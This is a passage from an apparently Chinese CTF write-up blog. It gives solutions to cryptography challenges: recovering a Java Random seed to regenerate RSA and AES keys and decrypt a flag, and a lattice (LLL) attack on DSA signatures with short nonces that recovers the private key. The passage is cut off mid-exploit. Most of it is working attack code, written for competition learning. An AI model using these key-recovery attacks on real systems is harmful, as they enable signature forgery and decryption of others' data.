class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">24</span>; j++) &#123;</span><br><span class="line">    localPrintWriter.println(((BigInteger)localArrayList1.get(j)).toString());</span><br><span class="line">    <span class="keyword">this</span>.states.add(localArrayList2.get(j)); <span class="comment">// states storing seed after second encryption(RSA)</span></span><br><span class="line">  &#125;</span><br><span class="line">  localPrintWriter.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (lrandout)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.stateselse &gt; <span class="number">0</span>) &#123; <span class="comment">// stateselse's initiation is 24</span></span><br><span class="line">  <span class="keyword">this</span>.stateselse -= <span class="number">1</span>;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint);</span><br><span class="line">  <span class="keyword">this</span>.statespoint += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> stateconvert(localBigInteger); <span class="comment">// return seed after third encryption(AES)</span></span><br><span class="line">&#125; <span class="comment">// stateconvert contains `encrypt` function</span></span><br><span class="line">gen_new_states();</span><br><span class="line"><span class="keyword">return</span> lrandout();</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (gen_new_states)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">  BigInteger localBigInteger = (BigInteger)<span class="keyword">this</span>.states.get(<span class="keyword">this</span>.statespoint - <span class="number">24</span> + i); </span><br><span class="line">  <span class="keyword">byte</span>[] arrayOfByte = encrypt(localBigInteger);    </span><br><span class="line">  <span class="keyword">this</span>.states.add(<span class="keyword">new</span> BigInteger(arrayOfByte));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.stateselse += <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// key code (encrypt)</span></span><br><span class="line">IvParameterSpec localIvParameterSpec = <span class="keyword">new</span> IvParameterSpec(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">this</span>.random.nextBytes(arrayOfByte1); <span class="comment">// using random.nextBytes to genKey for AES</span></span><br><span class="line">SecretKeySpec localSecretKeySpec = <span class="keyword">new</span> SecretKeySpec(arrayOfByte1, <span class="string">"AES"</span>);</span><br><span class="line">Cipher localCipher = Cipher.getInstance(<span class="string">"AES/CBC/NoPadding"</span>);</span><br><span class="line"><span class="comment">// AES encrypt part</span></span><br></pre></td></tr></table></figure><p><strong>加密链</strong></p><p><code>oldtest</code>先调用了20次java的<code>nextInt()</code></p><p><code>this.seed</code>经过<span class="math inline">\(GF(2^{256})\)</span>下的平方运算后生成<code>state</code></p><p><code>state</code>通过RSA part生成的24组<span class="math inline">\((p,q),e=17\)</span>，加密得到<code>this.states</code> (len(states == 24))</p><p><code>lrandout</code>先AES/CBC完整加密了一次<code>this.states</code>的24个值，<strong>但该次并未更新<code>this.states</code></strong></p><p>由于<code>this.stateselse</code>此时为0，因此执行<code>lrandout</code>会先新生成24个state（即调用<code>gen_new_states</code>）</p><p>在旧states后新增一长度为24的states后，用新增的states加密得到的结果即为new.txt中内容</p><p><strong>攻击思路</strong></p><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-17_16-13-09.png"></p><p>a, b, m均已知，且hidden length仅为16bits的Truncated LCG，直接爆破PRNG_seed的hidden部分即可</p><p>得到PRNG_seed后，加密源码后续中所有生成的随机数均可预测</p><p>而用到随机数生成的有<span class="math inline">\(p,q\)</span>生成及<span class="math inline">\(AES\_Encryption\)</span>中的genKey</p><p>加密部分最后的两次<code>lrandout</code>，再加上其中间的<code>gen_new_states</code>，共调用了三次<code>encrypt</code>（72次AES/CBC的Genkey）</p><p>因此所有过程可控，恢复即可</p><h4 id="exp">[exp]</h4><p><code>SeedAttack.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeedAttack</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> a = <span class="number">0x5deece66dL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> b = <span class="number">11L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> m = <span class="number">0xffffffffffffL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">crack_seed</span><span class="params">(<span class="keyword">long</span> d1, <span class="keyword">long</span> d2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> seed = (d1 &lt;&lt; <span class="number">16</span>) + i;</span><br><span class="line">            <span class="keyword">long</span> guess_d2 = (a * seed + b &amp; m) &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">if</span> (guess_d2 == d2) &#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] PRNG's seed: "</span> + String.valueOf(seed));</span><br><span class="line">                <span class="keyword">return</span> seed;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"[!] PRNG crack failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment">//        SeedAttack localSeedAttack = new SeedAttack();</span></span><br><span class="line"><span class="comment">//        long d1 = -1029728314L;</span></span><br><span class="line"><span class="comment">//        long d2 = 1487023297L;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            long seed = localSeedAttack.crack_seed(d1, d2);</span></span><br><span class="line"><span class="comment">//            System.out.println(seed);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(e.getMessage());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CMA.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CMA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CMA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> PRNG_seed = <span class="number">0L</span>;</span><br><span class="line">        SeedAttack localSeedAttack = <span class="keyword">new</span> SeedAttack();</span><br><span class="line">        <span class="keyword">long</span> d1 = -<span class="number">1029728314L</span>;</span><br><span class="line">        <span class="keyword">long</span> d2 = <span class="number">1487023297L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PRNG_seed = localSeedAttack.crack_seed(d1, d2);</span><br><span class="line"><span class="comment">//            System.out.println(PRNG_seed);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.random.setSeed(PRNG_seed ^ <span class="number">0x5DEECE66DL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// discard trash which generate old.txt</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discardTrash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genRSA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BigInteger e = BigInteger.valueOf(<span class="number">17L</span>);</span><br><span class="line">        ArrayList&lt;ArrayList&gt; RSA_params = <span class="keyword">new</span> ArrayList&lt;ArrayList&gt;(<span class="number">24</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">            ArrayList curRSAparams = <span class="keyword">new</span> ArrayList(<span class="number">2</span>);</span><br><span class="line">            BigInteger p = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            BigInteger q = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            curRSAparams.add(p);</span><br><span class="line">            curRSAparams.add(q);</span><br><span class="line">            RSA_params.add(curRSAparams);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"prikey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">                ArrayList curRSAparams = RSA_params.get(i);</span><br><span class="line">                String p = curRSAparams.get(<span class="number">0</span>).toString();</span><br><span class="line">                String q = curRSAparams.get(<span class="number">1</span>).toString();</span><br><span class="line">                localPrintWriter.println(<span class="string">"("</span> + p + <span class="string">", "</span> + q + <span class="string">")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] RSA's priKey found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException error) &#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer localStringBuffer = <span class="keyword">new</span> StringBuffer(paramArrayOfByte.length * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; paramArrayOfByte.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((paramArrayOfByte[i] &amp; <span class="number">0xFF</span>) &lt; <span class="number">16</span>) localStringBuffer.append(<span class="string">"0"</span>);</span><br><span class="line">            localStringBuffer.append(Long.toString(paramArrayOfByte[i] &amp; <span class="number">0xFF</span>, <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> localStringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"AESkey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] key = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">                <span class="keyword">this</span>.random.nextBytes(key);</span><br><span class="line">                localPrintWriter.println(byte2hex(key));</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] AES's key found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CMA exp = <span class="keyword">new</span> CMA();</span><br><span class="line">        exp.discardTrash();</span><br><span class="line">        exp.genRSA();</span><br><span class="line">        exp.genKey();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">()</span>:</span></span><br><span class="line">    pqs = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'prikey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fRSA:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fRSA:</span><br><span class="line">            pq = re.findall(<span class="string">r"\((.*), (.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            pqs.append((int(pq[<span class="number">0</span>]), int(pq[<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'AESkey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fAES:</span><br><span class="line">        key = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fAES]</span><br><span class="line">        key = [key[:<span class="number">24</span>], key[<span class="number">24</span>:<span class="number">48</span>], key[<span class="number">48</span>:]]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'new.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fCIPHER:</span><br><span class="line">        cipher = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fCIPHER]</span><br><span class="line">    <span class="keyword">return</span> pqs, key, cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec1</span><span class="params">(p, q, c, key1, key2)</span>:</span></span><br><span class="line">    aes2 = AES.new(key2, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = aes2.decrypt(c)</span><br><span class="line">    aes1 = AES.new(key1, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = bytes_to_long(aes1.decrypt(c))</span><br><span class="line">    e = <span class="number">17</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(x)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(x)[<span class="number">2</span>:]:</span><br><span class="line">        a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (int(i)):</span><br><span class="line">            a = a ^ x</span><br><span class="line">        <span class="keyword">if</span> a &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            a = a ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = mul(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"flag"</span> <span class="keyword">in</span> long_to_bytes(m):</span><br><span class="line">            print(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pqs, key, cipher = getData()</span><br><span class="line">    m = dec1(pqs[<span class="number">0</span>][<span class="number">0</span>], pqs[<span class="number">0</span>][<span class="number">1</span>], cipher[<span class="number">0</span>], key[<span class="number">1</span>][<span class="number">0</span>], key[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    dec2(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;86824087489918371343860652&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="gxzyctf2020---hnp">[GxzyCTF2020 - HNP]</h3><h4 id="题目考点-1">[题目考点]</h4><ul><li>Hidden Number Problem</li></ul><h4 id="题目文件-1">[题目文件]</h4><p><a href="HNP.zip">Click Here to Download</a></p><h4 id="题解分析-1">[题解分析]</h4><p><span class="math inline">\(q\rightarrow 128bits,\quad p\rightarrow 1024bits,\quad q\mid (p-1)\)</span></p><p><span class="math inline">\(g=2^{\frac{p-1}{q}}mod\ p,\quad x\rightarrow priKey,\quad y=g^{x}mod\ p\rightarrow pubKey\)</span></p><p><strong>签名: </strong><span class="math inline">\(r=(g^{k}mod\ p)mod\ q,\quad s=k^{-1}(H(m)+xr)mod\ q\)</span></p><p>变形可得：<span class="math inline">\(s^{-1}(H(m)+xr)\equiv k(mod\ q)\)</span></p><p>假设k存在上界K，则有<span class="math inline">\(|s^{-1}H(m)+(s^{-1}r)x|&lt;K(mod\ q)\)</span></p><p>令<span class="math inline">\(A=s^{-1}H(m),\quad B=s^{-1}r\)</span>，可建立如下格基： <span class="math display">\[\left[\begin{matrix}q &amp; ... &amp; ... &amp; 0 &amp; 0 &amp; 0\\0 &amp; q &amp; ... &amp; 0 &amp; 0 &amp; 0\\... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ...\\0 &amp; 0 &amp; ... &amp; q &amp; 0 &amp; 0\\B_{1} &amp; B_{2} &amp; ... &amp; B_{n} &amp; a &amp; 0\\A_{1} &amp; A_{2} &amp; ... &amp; A_{n} &amp; 0 &amp; b\end{matrix}\right]\]</span> 下对参数<span class="math inline">\(a,b\)</span>取值进行估计<span class="math inline">\((K=2^{121},n=35)\)</span>：</p><p>需令<span class="math inline">\([k_{1},k_{2},...,k_{n},ax,b]\)</span>为SVP目标向量</p><p><span class="math inline">\(2^{\frac{n+1}{4}}(q^{n}ab)^{\frac{1}{n+2}}&gt;\sqrt{nK^{2}+(ax)^{2}+b^{2}}\)</span></p><p><span class="math inline">\(2^{18}2^{128\cdot \frac{70}{37}}(ab)^{\frac{2}{37}}&gt;35\cdot 2^{242}+2^{256}a^{2}+b^{2}\)</span></p><p>放缩为<span class="math inline">\(2^{260}(ab)^{\frac{2}{37}}&gt;2^{251}+2^{256}a^{2}+b^{2}\)</span></p><p>显然在<span class="math inline">\(ab=1\)</span>时，令<span class="math inline">\(a=\frac{1}{2^{64}},b=2^{64}\)</span>，即明显满足上述不等式（<span class="math inline">\(2^{128}a=b\)</span>）</p><p>本地作测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># genKey for DSA</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = getRandomNBitInteger(<span class="number">1024</span> - <span class="number">128</span> - <span class="number">1</span>)</span><br><span class="line">    p = (t * <span class="number">2</span>*q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = (p - <span class="number">1</span>) // q</span><br><span class="line">g = pow(<span class="number">2</span>, e, p)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">y = int(pow(g, x, p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(Hm)</span>:</span></span><br><span class="line">    k = getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">121</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">()</span>:</span></span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"0xDktb"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        r, s = sign(Hm)</span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> x != crack_x():</span><br><span class="line">        print(<span class="string">"Failed"</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-18_17-07-26.png"></p><p>在<span class="math inline">\(K=2^{121},n=35\)</span>时，测试成功率可视作100%，但令<span class="math inline">\(K=2^{122}\)</span>时，虽然界仍满足，但是成功率有亿点点低（迷惑行为</p><p>因此远程获取<span class="math inline">\(k\_bits&lt;122\)</span>的35组签名数据，即可破解私钥x，本地生成admin的签名，实现越权</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 